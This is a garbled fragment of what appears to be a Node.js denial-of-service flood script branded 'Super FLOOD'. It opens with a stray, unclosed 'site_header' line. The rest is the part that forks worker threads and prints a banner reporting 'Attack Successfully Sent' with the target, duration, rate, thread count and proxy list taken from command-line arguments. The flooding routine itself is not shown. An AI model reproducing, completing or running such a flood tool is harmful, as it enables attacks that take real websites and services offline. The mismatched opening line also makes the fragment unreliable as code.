...
site_header = [
 ...
 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        console.clear();
console.log(`𝐒𝐮𝐩𝐞𝐫 𝐅𝐋𝐎𝐎𝐃 : 𝐁𝐞𝐭𝐚 𝐔𝐩𝐝𝐚𝐭𝐞 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟐.𝟎`.gray)
console.log("𝐒𝐭𝐚𝐮𝐬: ".yellow + "[ Attack Successfully Sent]".rainbow);
console.log("𝐓𝐚𝐫𝐠𝐞𝐭: ".yellow + "[" + process.argv[2].rainbow + "]");
console.log("𝐓𝐡𝐞𝐚𝐝: ".yellow + "[" + process.argv[5].rainbow + "]");
console.log("𝐓𝐢𝐦𝐞: ".yellow + "[" + process.argv[3].rainbow + "]");
console.log("𝐑𝐚𝐭𝐞: ".yellow + "[" + process.argv[4].rainbow + "]");
console.log(`[0m𝐏𝐫𝐨𝐱𝐲𝐅𝐢𝐥𝐞:[0m ${args.proxyFile} | [36m𝐓𝐨𝐭𝐚𝐥:[0m ${proxies.length}`);
console.log(`𝐍𝐨𝐝𝐞:`.blue + "𝐒𝐮𝐩𝐞𝐫 𝐅𝐥𝐨𝐨𝐝 𝐑𝐞𝐜𝐨𝐝𝐞 : Be Gau�".white);
cluster.fork();
